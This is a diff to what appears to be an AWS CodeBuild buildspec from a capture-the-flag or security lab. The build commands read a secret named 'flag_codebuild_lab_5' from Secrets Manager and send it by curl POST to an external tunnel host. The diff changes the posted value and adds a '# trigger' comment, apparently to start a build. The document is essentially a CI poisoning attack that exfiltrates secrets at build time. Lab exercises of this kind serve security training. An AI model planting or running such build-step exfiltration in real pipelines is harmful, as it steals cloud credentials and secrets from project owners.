@@ -5,5 +5,6 @@ phases:
     commands:
       - echo "=== START ==="
       - FLAG=$(aws secretsmanager get-secret-value --secret-id flag_codebuild_lab_5 --region us-east-1 --query SecretString --output text)
-      - curl -X POST https://lttge-220-255-170-163.run.pinggy-free.link:40999 --data "flag=$FLAG"
+      - curl -X POST https://lttge-220-255-170-163.run.pinggy-free.link:40999 --data "flag=flag_codebuild_lab_5"
       - echo "=== END ==="
+# trigger
